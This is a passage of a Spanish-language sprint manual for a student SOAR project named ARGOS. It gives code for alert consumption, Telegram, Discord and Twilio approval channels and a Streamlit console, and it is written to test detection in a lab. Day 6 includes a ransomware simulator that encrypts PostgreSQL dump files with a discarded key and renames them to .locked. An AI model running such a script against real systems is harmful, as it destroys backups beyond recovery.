`soar/decision_engine/orchestrator.py`:
```python
"""Decision Engine orchestrator. Subscribes to Redis stream, classifies, persists."""

import asyncio
import json
import redis
from datetime import datetime, timezone

from argos_contracts import (
    Incident, IncidentState, NormalizedAlert, Tier, ProposedAction, ActionType,
)
from soar.decision_engine.tier_classifier import classify
from soar.decision_engine.state_machine import IncidentStateMachine


async def consume_alerts():
    r = redis.from_url("redis://localhost:6379/0", decode_responses=True)
    sm = IncidentStateMachine()

    last_id = "$"  # only new messages
    while True:
        messages = r.xread({"wazuh:alerts": last_id}, block=5000, count=10)
        for _stream, entries in messages:
            for entry_id, fields in entries:
                last_id = entry_id
                alert = NormalizedAlert.model_validate_json(fields["data"])
                # Classify
                tier = classify([alert], ml_score=None, canary_fired=False)
                # ...
                # (rest of orchestration on Day 5)
```

Por hoy solo el consumer básico.

### Paso 4.3 — Primer ensayo UC-01 (1 hora)

Coordinas con P4 (que tenga el lab levantado) y P3 (que tenga al menos 2 reglas Sigma deployed):

1. P4 levanta lab, verifica Wazuh recibe eventos.
2. P3 verifica que su regla Sigma para `vssadmin delete shadows` está cargada.
3. P1 (tú) arranca el SOAR orchestrator + LLM Triage + Approval API.
4. P4 ejecuta el simulador: `python attack-simulation/ransomware_simulator/lockbit_like.py --target windows-victim --path 'C:\Users\Demo\Documents\argos_demo'`.
5. Verificas que Wazuh dispara la regla Sigma, llega a Redis, el SOAR clasifica como T0/T1, y el LLM enriquece.

Si no funciona, listas los puntos de falla y los discuten en standup mañana.

### Paso 4.4 — Commit (10 min)

```bash
git add attack-simulation/ soar/decision_engine/orchestrator.py
git commit -m "feat(p1): ransomware simulator LockBit-like + SOAR orchestrator skeleton"
git push
```

### Verificación EOD Día 4

- [ ] Simulator dry-run funciona en localhost
- [ ] Simulator real cifra archivos en directorio sandbox
- [ ] SOAR orchestrator consume Redis stream sin crash
- [ ] Primer ensayo UC-01 con los 3 integrantes — si no funciona, lista de bugs documentada en Discord

---

## Día 5 (Viernes) — Multi-channel notifications + Streamlit Approval Console

**Goal del día:** Telegram + Discord + Email funcionando, Streamlit Console básica mostrando estado del incidente en tiempo real.

**Tiempo estimado:** 7 horas (el día más largo).

### Paso 5.1 — Telegram channel con botones inline JWT (1.5 horas)

`soar/notification/telegram_channel.py`:
```python
"""Telegram notification channel per ADR-0007 v2 — primary, t=0."""

import os
from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup

from argos_contracts import ApprovalRequest
from soar.approval.jwt_signer import JWTSigner


class TelegramChannel:
    def __init__(self, bot_token: str | None = None):
        self.bot = Bot(token=bot_token or os.environ["TELEGRAM_BOT_TOKEN"])
        self.signer = JWTSigner()
        self.approver_chat_ids = [
            int(cid) for cid in os.environ["TELEGRAM_APPROVER_CHAT_IDS"].split(",")
        ]
        self.api_base = os.environ.get(
            "APPROVAL_API_PUBLIC_URL", "http://localhost:8003"
        )

    async def send(self, req: ApprovalRequest) -> None:
        for chat_id in self.approver_chat_ids:
            approver_email = self._get_email_for_chat(chat_id)
            token = self.signer.sign(req.incident_id, approver_email)

            kb = InlineKeyboardMarkup([[
                InlineKeyboardButton("✅ Approve", url=f"{self.api_base}/approval/{token}?decision=approve"),
                InlineKeyboardButton("❌ Reject",  url=f"{self.api_base}/approval/{token}?decision=reject"),
            ]])

            text = (
                f"🛡 *ARGOS Alert {req.tier.value}*\n\n"
                f"Incident: `{req.incident_id}`\n"
                f"{req.alert_summary}\n\n"
                f"Timeout: {req.timeout_seconds}s"
            )
            await self.bot.send_message(
                chat_id=chat_id, text=text,
                reply_markup=kb, parse_mode="Markdown",
            )

    def _get_email_for_chat(self, chat_id: int) -> str:
        # mapping simple — en producción esto va a config
        return f"approver-{chat_id}@demo.local"
```

### Paso 5.2 — Discord channel (45 min)

`soar/notification/discord_channel.py`:
```python
"""Discord webhook per ADR-0007 v2 — team visibility, t=0."""

import os
import httpx
from argos_contracts import ApprovalRequest


class DiscordChannel:
    def __init__(self, webhook_url: str | None = None):
        self.webhook_url = webhook_url or os.environ["DISCORD_WEBHOOK_URL"]
        self.role_id = os.environ.get("DISCORD_APPROVERS_ROLE_ID", "")

    async def send(self, req: ApprovalRequest) -> None:
        mention = f"<@&{self.role_id}>" if self.role_id else ""
        embed = {
            "title": f"🛡 ARGOS {req.tier.value} — {req.incident_id}",
            "description": req.alert_summary,
            "color": {"T0": 0x991B1B, "T1": 0xC2410C, "T2": 0xA16207, "T3": 0x1D4ED8}[req.tier.value],
            "fields": [
                {"name": "Timeout", "value": f"{req.timeout_seconds}s", "inline": True},
            ],
        }
        async with httpx.AsyncClient() as c:
            await c.post(self.webhook_url, json={
                "content": f"{mention} Approval required",
                "embeds": [embed],
            })
```

### Paso 5.3 — Streamlit Approval Console (3 horas)

`ui/streamlit_app/pages/02_approval_console.py`:
```python
"""Approval Workflow Console per SAD §9.2.2."""

import time
import streamlit as st
from streamlit_autorefresh import st_autorefresh

from soar.decision_engine.state_machine import IncidentStateMachine


st_autorefresh(interval=2000, key="approval_refresh")
st.title("🛡 ARGOS — Approval Workflow Console")

sm = IncidentStateMachine()

# Sidebar — select incident
incident_id = st.sidebar.text_input("Incident ID", value="INC-2026-05-26-001")
incident = sm.load(incident_id)

if incident is None:
    st.warning(f"Incident {incident_id} not found. Live ones will appear here.")
    st.stop()

# Three columns
col1, col2, col3 = st.columns([1, 2, 1])

with col1:
    st.subheader("Incident Card")
    st.metric("Tier", incident.tier.value)
    st.write(f"**Host:** {incident.host.id}")
    st.write(f"**State:** `{incident.state.value}`")
    if incident.llm_analysis:
        with st.expander("LLM Analysis"):
            st.write(incident.llm_analysis.accion_recomendada)

with col2:
    st.subheader("Decision Matrix")
    for approver in incident.approvers:
        emoji = {
            "pending": "🟡", "approved": "🟢",
            "rejected": "🔴", "timeout": "⚫",
        }[approver.status.value]
        latency = (
            f"{approver.latency_seconds:.0f}s"
            if approver.latency_seconds else "—"
        )
        st.write(f"{emoji} {approver.email} ({approver.role}) · {latency}")

with col3:
    st.subheader("System Logic")
    st.write(f"State: **{incident.state.value}**")
    if incident.consolidation_window:
        elapsed = (time.time() - incident.consolidation_window.started_at.timestamp())
        remaining = max(0, incident.consolidation_window.duration_seconds - elapsed)
        st.metric("Consolidation window", f"{remaining:.0f}s")
        if incident.consolidation_window.conflict_detected:
            st.error("⚠ CONFLICT DETECTED")
    if incident.final_decision:
        st.success(f"Final: {incident.final_decision.outcome}")
        st.caption(f"Policy: {incident.final_decision.policy_applied}")
```

Levantar:
```bash
streamlit run ui/streamlit_app/pages/02_approval_console.py
# abre http://localhost:8501
```

### Paso 5.4 — Ensayo UC-02 (45 min)

Con P3 que tenga canaries puestos en lab y FIM monitoreando, y P4 con lab arriba:
1. Ejecutas un script que toque `db_backup.sql` (canary).
2. Wazuh dispara la regla custom canary, llega a Redis.
3. SOAR clasifica como T0 (canary alone).
4. Notificación va a Telegram + Discord.
5. Streamlit Console se actualiza mostrando T0 y aislamiento ejecutado.

### Paso 5.5 — Commit (10 min)

```bash
git add soar/notification/ ui/
git commit -m "feat(p1): Telegram + Discord notifications + Streamlit Approval Console"
git push
```

### Verificación EOD Día 5

- [ ] Telegram envía mensaje con botones inline funcionales
- [ ] Discord webhook recibe embed con role mention
- [ ] Streamlit Console muestra incident en tiempo real
- [ ] Ensayo UC-02 ejecuta end-to-end con los 3 integrantes

---

## Día 6 (Sábado) — Two-person rule + Twilio Voice + UC-04

**Goal del día:** UC-04 con two-person rule funcional, Twilio Voice escalación operativa.

**Tiempo estimado:** 6 horas.

### Paso 6.1 — Twilio Voice DTMF (2.5 horas)

`soar/notification/twilio_voice_channel.py`:
```python
"""Twilio Voice DTMF per ADR-0007 v2 — escalation at t=60s."""

import os
from twilio.rest import Client
from argos_contracts import ApprovalRequest


class TwilioVoiceChannel:
    def __init__(self):
        self.client = Client(
            os.environ["TWILIO_ACCOUNT_SID"],
            os.environ["TWILIO_AUTH_TOKEN"],
        )
        self.from_number = os.environ["TWILIO_FROM_NUMBER"]
        self.to_numbers = os.environ["TWILIO_APPROVER_PHONES"].split(",")

    async def send(self, req: ApprovalRequest) -> None:
        twiml_url = f"{os.environ['APPROVAL_API_PUBLIC_URL']}/voice/twiml/{req.incident_id}"
        for phone in self.to_numbers:
            self.client.calls.create(
                to=phone, from_=self.from_number, url=twiml_url,
            )
```

Endpoint TwiML en `soar/approval/api.py`:
```python
@app.get("/voice/twiml/{incident_id}", response_class=Response)
async def voice_twiml(incident_id: str) -> Response:
    twiml = f"""<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Gather numDigits="1" action="/voice/handle/{incident_id}" timeout="10">
    <Say language="es-MX" voice="alice">
      Alerta crítica de ARGOS. Tier T2 en host. Throttle activo.
      Presione 1 para aprobar aislamiento. Presione 2 para rechazar.
    </Say>
  </Gather>
</Response>"""
    return Response(content=twiml, media_type="application/xml")


@app.post("/voice/handle/{incident_id}")
async def voice_handle(incident_id: str, Digits: str = ""):
    decision = "approve" if Digits == "1" else "reject"
    # Process decision
    return Response(content='<?xml version="1.0"?><Response><Say>Gracias</Say></Response>', media_type="application/xml")
```

### Paso 6.2 — UC-04 PostgreSQL variant (1.5 horas)

`attack-simulation/ransomware_simulator/postgres_attack.py`:
```python
"""UC-04 — attack on PostgreSQL data directory + dumps."""

import argparse
from pathlib import Path
from cryptography.fernet import Fernet


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument("--postgres-data", default="/var/lib/postgresql/15/main")
    parser.add_argument("--postgres-backups", default="/var/backups/postgres")
    args = parser.parse_args()

    # Encrypt pg_dump exports
    backup_dir = Path(args.postgres_backups)
    if backup_dir.exists():
        dumps = list(backup_dir.glob("*.sql"))
        key = Fernet.generate_key()
        cipher = Fernet(key)
        for d in dumps:
            data = d.read_bytes()
            d.write_bytes(cipher.encrypt(data))
            d.rename(d.with_suffix(".sql.locked"))
        print(f"Encrypted {len(dumps)} pg_dump files")
    else:
        print(f"Backup dir {backup_dir} not found — coordinate with P4")


if __name__ == "__main__":
    main()
```

### Paso 6.3 — Two-person rule wiring (1 hora)

Integra `is_two_person_rule()` y `resolve_two_person()` en el SOAR orchestrator. Cuando llega un incidente, verifica `incident.host.criticality == PRODUCTION_CRITICAL` y enruta diferente.

### Paso 6.4 — Ensayo UC-04 (45 min)

Con P4 que tenga PostgreSQL + lab arriba, los 4 integrantes con celulares listos:
1. P4 ejecuta `postgres_attack.py`.
2. Sigma + ML disparan, SOAR detecta criticality=production-critical → two-person rule.
3. Los 4 reciben Telegram. P1 y P2 aprueban. P3 espera. P4 timeout.
4. Sistema espera 2 aprobaciones, ejecuta cuando llega la segunda.

### Paso 6.5 — Commit (10 min)

```bash
git add soar/ attack-simulation/ranosomware_simulator/postgres_attack.py
git commit -m "feat(p1): Twilio Voice DTMF + UC-04 postgres simulator + two-person rule wiring"
git push
```

### Verificación EOD Día 6

- [ ] Twilio Voice llama y reproduce TwiML
- [ ] DTMF 1 registra approve, DTMF 2 registra reject
- [ ] Simulador postgres_attack cifra dumps en lab
- [ ] Two-person rule espera 2 approves antes de ejecutar
- [ ] Ensayo UC-04 funcional con 4 integrantes

---

## Día 7 (Domingo) — Rehearsals + bug bash

**Goal del día:** los 3 use cases ensayados 5 veces sin crashear, bug bash de cualquier issue residual, vídeo de respaldo grabado.

**Tiempo estimado:** 6 horas distribuidas en mañana, tarde, noche.

### Mañana (9-13h) — Rehearsals

5 corridas seguidas de cada UC con cronómetro. Anotas en `docs/rehearsal-week1.md`:
- Tiempo total UC-01
- Tiempo total UC-02
- Tiempo total UC-04
- Bugs encontrados (en formato Discord para tracking)

### Tarde (14-18h) — Bug bash

Cada integrante toma 2-3 bugs de la lista. Te toca a ti (P1) los bugs relacionados con SOAR / LLM / Approval / Streamlit. Bugs típicos a esperar:
- Telegram pierde mensaje cuando hay 4 messages simultáneos
- Streamlit no refresca a 2s sino a 5s (subir frecuencia)
- JWT token expira muy rápido en demo (subir a 10 min)
- LLM tarda 3s en responder, demo se siente lento (cachear respuestas comunes con DEMO_MODE=true)

### Noche (19-21h) — Vídeo de respaldo

P4 graba video del demo completo en buenas condiciones (con OBS o similar). Tú narras encima. Lo guardas en USB + Drive para que en el día del demo si todo se cae, narras sobre el video.

### Entregable del día

`docs/PROJECT_STATUS.md` actualizado con honest status: qué funciona, qué falla, lista priorizada de bugs para la semana siguiente.

```bash
# Update PROJECT_STATUS.md con sección nueva
git add docs/PROJECT_STATUS.md
git commit -m "docs: sprint week 1 retrospective + status update"
git push
```

### Verificación EOD Día 7

- [ ] 5 rehearsals de UC-01 exitosos (ninguno crashea)
- [ ] 5 rehearsals de UC-02 exitosos
- [ ] 5 rehearsals de UC-04 exitosos
- [ ] Video de respaldo grabado y backed up en USB + Drive
- [ ] PROJECT_STATUS.md actualizado con estado real
- [ ] Lista de bugs P1/P2/P3 priorizada para semana 2

---

## Apéndice A — Comandos diarios que vas a usar todo el tiempo

```bash
# Activar env
cd ~/projects/argos && source .venv/bin/activate

# Levantar todos los servicios P1 (en terminales separadas)
LLM_BACKEND=openai uvicorn llm_triage.api.main:app --port 8002 --reload
uvicorn soar.approval.api:app --port 8003 --reload
streamlit run ui/streamlit_app/pages/02_approval_console.py

# Tests rápidos
pytest argos_contracts/tests/ soar/tests/ -x  # -x para detener en primer fail

# Reload Ollama (si Llama no responde)
pkill ollama && ollama serve &

# Limpiar Redis
redis-cli FLUSHDB

# Ver alertas en Redis stream
redis-cli XRANGE wazuh:alerts - +
```

## Apéndice B — Cuando algo se rompa

| Síntoma | Diagnóstico rápido | Fix |
|---------|--------------------|-----|
| `/triage` devuelve 500 | OpenAI key, Ollama down, o validation error | Check logs uvicorn. Probar con `LLM_BACKEND=llama_local` |
| Telegram no envía | Token mal, chat_id wrong, o bot bloqueado | `curl https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/getMe` |
| Streamlit no refresca | `streamlit-autorefresh` no instalado | `pip install streamlit-autorefresh` |
| Redis connection refused | Servicio no corriendo | `brew services start redis` o `sudo systemctl start redis` |
| JWT InvalidSignatureError | `JWT_SECRET` distinto entre signer y verifier | Verificar `.env` cargado en ambos procesos |
| Twilio "trial accounts can only call verified numbers" | Número no verificado en Twilio | Console Twilio → Verified Caller IDs → add |
| Approval API 401 con token válido | Reloj desfasado entre máquinas | `ntpdate -s time.nist.gov` (Linux) o sync automático |

## Apéndice C — Si llegas hasta acá y todo funciona

Felicidades, completaste el sprint de la semana 1. Las semanas 2 y 3 son para:

1. UC-03 split-brain centerpiece (semana 2)
2. Calibración Q5 thresholds con dataset real (semana 2)
3. UC-05 stealth attack (semana 2 opcional)
4. Informe técnico final (semana 3)
5. 10 rehearsals con timing perfecto (semana 3)
6. Polish del video demo (semana 3)
7. Slide deck (semana 3)

Si llegas a Día 7 con UC-01 + UC-02 + UC-04 corriendo end-to-end, **tienes la nota de implementación funcional asegurada**. El resto es polish.

---

## Change log

| Versión | Fecha | Cambio | Autor |
|---------|-------|--------|-------|
| 1.0 | 2026-05-24 | Initial detailed manual for P1. 7-day plan with commands, code snippets, verification steps, common bloqueos. | P1 |
